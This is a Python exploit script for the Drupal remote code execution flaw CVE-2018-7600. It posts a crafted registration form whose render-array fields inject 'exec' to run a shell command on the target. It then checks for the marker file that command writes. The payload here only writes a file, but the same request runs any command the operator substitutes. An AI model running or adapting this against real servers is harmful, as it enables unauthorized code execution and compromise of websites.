
import sys
import requests

def exploit(target):
    pass
    proxies = {
    'http': "http://127.0.0.1:8080",
    'https': "https://127.0.0.1:8080"
    }
    verify = False

    payload = {
        'form_id': 'user_register_form',
        '_drupal_ajax': '1',
        'mail[#post_render][]': 'exec',
        'mail[#type]': 'markup',
        'mail[#markup]': 'echo "vulnerable to cve-7600-2018 exploit" | tee vulnerable.txt'
    }
    url = target + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
    print ( '[*]' + ' requesting post')
    r = requests.post(url, proxies=proxies ,data=payload, verify=verify)
    try:
        scan = requests.get(target + '/vulnerable.txt')
        if scan.status_code != 200:
           print ( ' not vulnerable to cve-2018-7600 exploit \n')
        if scan.status_code == 200:
           print (' vulnerable to cve-2018-7600 exploit')
           print (' url: ' + target + 'vulnerable.txt \n')
    except requests.ConnectionError:
        print (' target connection timeout')
    except Exception as e :
        print ('Connction Failed ' + e )
				

if __name__ == '__main__':
   exploit(sys.argv[1])
